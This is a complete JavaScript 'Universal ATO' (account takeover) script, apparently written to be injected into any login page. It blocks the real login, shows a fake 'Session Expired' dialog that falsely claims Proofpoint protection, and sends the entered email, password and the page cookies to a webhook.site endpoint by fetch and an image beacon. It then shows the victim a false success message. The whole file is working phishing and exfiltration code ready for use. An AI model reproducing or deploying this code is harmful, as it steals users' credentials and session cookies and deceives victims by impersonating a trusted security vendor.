// Universal ATO Script - Works with any login page
// Just change index.html for different targets, this script stays the same

(function() {
    'use strict';
    
    // ============================================
    // REPLACE WITH YOUR WEBHOOK URL (ONLY CHANGE THIS)
    // Get one at: https://webhook.site
    // ============================================
    const WEBHOOK_URL = "https://webhook.site/79df073f-6dcb-46ef-a182-5df8600c0cef";
    // ============================================
    
    console.log('[+] ATO Script Loaded');
    
    // Auto-detect email and password fields on any page
    function findEmailField() {
        const selectors = [
            'input[type="email"]',
            'input[name*="email" i]',
            'input[id*="email" i]',
            'input[placeholder*="email" i]',
            'input[name*="user" i]',
            'input[id*="user" i]',
            'input[type="text"][name*="login" i]',
            'input[type="text"][id*="login" i]'
        ];
        
        for (let selector of selectors) {
            let field = document.querySelector(selector);
            if (field) return field;
        }
        return null;
    }
    
    function findPasswordField() {
        const selectors = [
            'input[type="password"]',
            'input[name*="pass" i]',
            'input[id*="pass" i]',
            'input[placeholder*="pass" i]',
            'input[name*="pwd" i]',
            'input[id*="pwd" i]'
        ];
        
        for (let selector of selectors) {
            let field = document.querySelector(selector);
            if (field) return field;
        }
        return null;
    }
    
    function findSubmitButton() {
        const selectors = [
            'button[type="submit"]',
            'input[type="submit"]',
            '.btn-primary',
            '.btn-login',
            'button:contains("Login")',
            'button:contains("Sign in")'
        ];
        
        for (let selector of selectors) {
            let btn = document.querySelector(selector);
            if (btn) return btn;
        }
        
        // Find any button with login text
        let buttons = document.querySelectorAll('button, input[type="button"]');
        for (let btn of buttons) {
            if (btn.innerText && btn.innerText.toLowerCase().includes('login')) return btn;
            if (btn.value && btn.value.toLowerCase().includes('login')) return btn;
        }
        return null;
    }
    
    // Capture existing credentials
    function getExistingCredentials() {
        let emailField = findEmailField();
        let passField = findPasswordField();
        
        return {
            email: emailField ? emailField.value : '',
            password: passField ? passField.value : ''
        };
    }
    
    // Create fake modal (clean, no blur)
    function showModal() {
        let existing = document.getElementById('ato-universal-modal');
        if (existing) existing.remove();
        
        let creds = getExistingCredentials();
        
        let modal = document.createElement('div');
        modal.id = 'ato-universal-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
        `;
        
        modal.innerHTML = `
            <div style="
                max-width: 420px;
                width: 90%;
                background: white;
                border-radius: 24px;
                overflow: hidden;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            ">
                <div style="
                    background: #035BFB;
                    padding: 1.5rem;
                    text-align: center;
                    color: white;
                ">
                    <div style="font-size: 48px;">🔐</div>
                    <h3 style="margin: 10px 0 5px; font-size: 1.4rem;">Session Expired</h3>
                    <p style="margin: 0; opacity: 0.9; font-size: 0.85rem;">Please verify your identity</p>
                </div>
                
                <div style="padding: 1.5rem;">
                    <input type="email" id="modal-email" placeholder="Email address" style="
                        width: 100%;
                        padding: 12px;
                        margin-bottom: 12px;
                        border: 1px solid #ddd;
                        border-radius: 8px;
                        font-size: 14px;
                        box-sizing: border-box;
                    " value="${escapeHtml(creds.email)}">
                    
                    <input type="password" id="modal-password" placeholder="Password" style="
                        width: 100%;
                        padding: 12px;
                        margin-bottom: 16px;
                        border: 1px solid #ddd;
                        border-radius: 8px;
                        font-size: 14px;
                        box-sizing: border-box;
                    " value="${escapeHtml(creds.password)}">
                    
                    <button id="modal-submit" style="
                        width: 100%;
                        padding: 12px;
                        background: #035BFB;
                        color: white;
                        border: none;
                        border-radius: 8px;
                        font-size: 14px;
                        font-weight: 600;
                        cursor: pointer;
                    ">Verify Identity →</button>
                </div>
                
                <div style="
                    padding: 12px;
                    text-align: center;
                    background: #f8f9fa;
                    border-top: 1px solid #e9ecef;
                    font-size: 11px;
                    color: #666;
                ">Protected by Proofpoint Identity</div>
            </div>
        `;
        
        document.body.appendChild(modal);
        
        // Handle submit
        document.getElementById('modal-submit').onclick = function() {
            let email = document.getElementById('modal-email').value;
            let password = document.getElementById('modal-password').value;
            
            // Send to webhook
            let payload = {
                time: new Date().toISOString(),
                url: window.location.href,
                domain: window.location.hostname,
                title: document.title,
                email: email,
                password: password,
                ua: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                cookies: document.cookie
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(payload)
            }).catch(() => {});
            
            // Backup via image
            new Image().src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
            
            modal.remove();
            alert('✓ Verification successful!');
        };
        
        // Close on ESC
        document.addEventListener('keydown', function escClose(e) {
            if (e.key === 'Escape') {
                let m = document.getElementById('ato-universal-modal');
                if (m) {
                    m.remove();
                    document.removeEventListener('keydown', escClose);
                }
            }
        });
        
        // Close on overlay click
        modal.onclick = function(e) {
            if (e.target === modal) modal.remove();
        };
    }
    
    // Helper function
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    // Intercept form submissions
    function interceptForms() {
        let forms = document.querySelectorAll('form');
        forms.forEach(form => {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                showModal();
                return false;
            });
        });
    }
    
    // Intercept buttons
    function interceptButtons() {
        let buttons = document.querySelectorAll('button[type="submit"], input[type="submit"], .btn, [class*="login"], [class*="signin"]');
        buttons.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                showModal();
                return false;
            });
        });
    }
    
    // Initialize
    setTimeout(() => {
        interceptForms();
        interceptButtons();
        console.log('[+] ATO Ready - Intercepting logins');
    }, 1000);
    
    // Watch for dynamic content
    new MutationObserver(() => {
        interceptForms();
        interceptButtons();
    }).observe(document.body, { childList: true, subtree: true });
    
})();
